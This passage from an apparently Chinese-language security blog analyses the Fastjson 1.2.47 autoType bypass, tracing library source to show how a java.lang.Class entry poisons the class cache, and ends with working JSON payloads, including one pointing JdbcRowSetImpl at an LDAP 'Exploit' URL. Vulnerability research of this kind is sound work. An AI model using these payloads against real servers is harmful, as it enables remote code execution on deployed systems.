class="line">                    &#125;</span><br><span class="line">				</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p>
<ol>
<li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li>
<li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li>
</ol>
<p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p>
<p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p>
<ol>
<li>TypeUtils.getClassFromMapping(typeName)</li>
<li>deserializers.findClass(typeName)</li>
</ol>
<h4 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h4><p>先看desesrializers，一个hashmap</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = <span class="keyword">new</span> IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure>
<p>因为我们是从中取值，关注一下它是在哪里赋值的，当前文件搜索<code>deserializers.put</code>。</p>
<p><code>com.alibaba.fastjson.parser.ParserConfig#initDeserializers</code>：给出一部分截图</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae208j8n5j315c0ks0vj.jpg" alt="initDeserializers.png"></p>
<p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p>
<p>除此之外还有两个类会影响到desesrializers这个map</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br><span class="line">    <span class="comment">//太过复杂代码省略</span></span><br></pre></td></tr></table></figure>
<p>在这个类中会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p>
<p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>代码极其简单，但是只在ParserConfig#getDeserializer（就是上面那个类）和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p>
<p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p>
<p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p>
<p>那我们换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
<h4 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h4><p>先看<code>getClassFromMapping</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line"> 	...</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure>
<p>看<code>addBaseClassMappings</code>这个方法，方法内容很长，我们就不细看了，但是它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addBaseClassMappings</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.put(<span class="string">"byte"</span>, <span class="keyword">byte</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"short"</span>, <span class="keyword">short</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"int"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    mappings.put(<span class="string">"long"</span>, <span class="keyword">long</span>.class);</span><br><span class="line">    <span class="comment">//诸如此类的放入一些固定的class至mappings中</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并且还只在两个没毛病的地方调用了这个方法：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae200kj2oj31es06o0tv.jpg" alt="addBaseClassMappings.png"></p>
<p>前者是一个static静态代码块：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>后者是一个<code>clearClassMapping</code>方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void clearClassMapping()&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没戏，不可控。</p>
<p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p>
<blockquote>
<p>其实这个TypeUtils.loadClass，在1.2.25-1.2.41中我们分析过一小段，其实是同一个函数！</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">       <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">    	<span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">       Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">       <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="comment">//是的话，直接返回</span></span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">       <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">           Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">           <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//判断className是否L开头;结尾，1.2.42，43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">       <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">           String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">           <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">               clazz = classLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">           <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">               clazz = contextClassLoader.loadClass(className);</span><br><span class="line">               <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">               <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                   mappings.put(className, clazz);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> clazz;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">    	<span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">//加载类</span></span><br><span class="line">           clazz = Class.forName(className);</span><br><span class="line">           <span class="comment">//直接放入mappings中</span></span><br><span class="line">           mappings.put(className, clazz);</span><br><span class="line">           <span class="keyword">return</span> clazz;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">           <span class="comment">// skip</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> clazz;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）</p>
<p>看看这个类在什么地方被引用。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zt2oc7j31hl09egn5.jpg" alt="loadClass.png"></p>
<p>前三者都是在<code>ParserConfig#autocheck</code>这个我们需要攻克的类中，如果能在那里调用loadClass并传入一个恶意类去加载。那就已经完成了我们的最终目的，根本不需要通过mappings这个空子去钻。</p>
<p>所以只需要看TypeUtils.java中的引用处。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>cache为true</strong>，一个好消息，因为有三处修改mapping的地方，两个地方需要cache为true。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1zmg3hyj31ny09pq4l.jpg" alt="loadClass2.png"></p>
<p>这百年可以看到在这个类中会自己引用自己的类，跳来跳去，但是也有外部的类引用当前类。这是我们主要关注的。（因为一个底层的工具类，不可能被我们直接调用到）</p>
<p>慢慢看，把跳出去的接口理出来</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ze46z5j31mu0clwgz.jpg" alt="loadclass3.png"></p>
<p>这两个静态的，没搞头，就不看了。</p>
<p>只有上面一个跳出去<code>MiscCodec.java#deserialze</code>的，我们再过去看看：</p>
<blockquote>
<p>以下代码段请一大段一大段倒着回退回来看</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">      JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">      <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object objVal;</span><br><span class="line"><span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">      <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">      <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值为	TypeNameRedirect</span></span><br><span class="line">          parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">          parser.accept(JSONToken.COMMA);</span><br><span class="line">	<span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">           <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">          <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">              <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">              <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">              <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">              lexer.nextToken();</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.COLON);</span><br><span class="line">	<span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.RBRACE);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">          <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String strVal;</span><br><span class="line"><span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">      <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">          strVal = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">          strVal = (String) objVal;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//不必进入的分支</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">      	<span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">          <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">          <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p>
<ol>
<li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p>
<p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p>
</li>
<li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。再加上<strong>clazz=class类</strong></p>
<p>大概需要一个json串如下:<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p>
</li>
</ol>
<p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yzmow5j315a0d875h.jpg" alt="DefaultJSONParser-384.png"></p>
<h4 id="定向砸payload"><a href="#定向砸payload" class="headerlink" title="定向砸payload"></a>定向砸payload</h4><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">	<span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
<p>这里有我们的三个在乎的点，如下顺序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个分析过了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yrwgg9j31du0gnabi.jpg" alt="class-go1.png"></p>
<p>从<code>deserializers.findClass(typeName)</code>出去，这是我们之前分析过的一处可以绕过白名单黑名单出去的地方，但是这里只存放一些默认类，不可污染。而我们的class.class就在这个默认类列表中，自然直接出去了。（比如class.class怎么也不会匹配到黑名单，不这里出去，也是可以下面出去的）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ylwm5kj31ms163q9k.jpg" alt="class-go2png.png"></p>
<p>再是，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。这个payload砸的没错。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yfjv3dj31px0c60ud.jpg" alt="class-go3.png"></p>
<p>可以发现进入了我们预计希望进入的<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>，可以看到上面有复杂的if判断，这就是得到初步的思路之后砸payload的好处，如果满足条件，我们就不用费力气去想这些是为啥的，反正默认进来了，不满足我们再去看哪里不符合就行。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y8ah44j315c12vn1i.jpg" alt="class-go4.png"></p>
<p>一切按照计划进行。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y0ztirj30w706uwew.jpg" alt="class-go5.png"></p>
<p>由于objVal是一个String，继续赋值给strVal</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xtd6q3j30z404qjri.jpg" alt="class-go6.png"></p>
<p>跳跳跳，我们之前由checkAutoType得到的clazz为Class.class，进入loadCLass</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xjwj9qj312r03tgls.jpg" alt="class-go7.png"></p>
<p>默认cache为true，之前分析的时候也说到cache为true对我们来说是个好消息。接下来会有三种情况可以污染我们的关键mapping。看看会进入哪一个</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1x8rjbbj31ce0zh77r.jpg" alt="class-go8.png"></p>
<p>下一个</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wztxobj31gy12lq8g.jpg" alt="class-go9.png"></p>
<p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p>
<p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。这就是大黑阔嘛，爱了爱了。</p>
<blockquote>
<p>现在回头来看这个mapping看到现在，就是放入一些已经加载过了的类，在checkAutoType中就不进行检查来提高速度。</p>
</blockquote>
<p>来一个调用栈：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wnadlyj30pi0brta3.jpg" alt="1.2.47-调用栈.png"></p>
<p>那么获取一个有恶意类的类似缓存机制的mapping有啥用呢。再进一步@type就好。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1w1dpcnj31om1057e4.jpg" alt="1.2.47-success.png"></p>
<p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p>
<p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了以下一个。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span 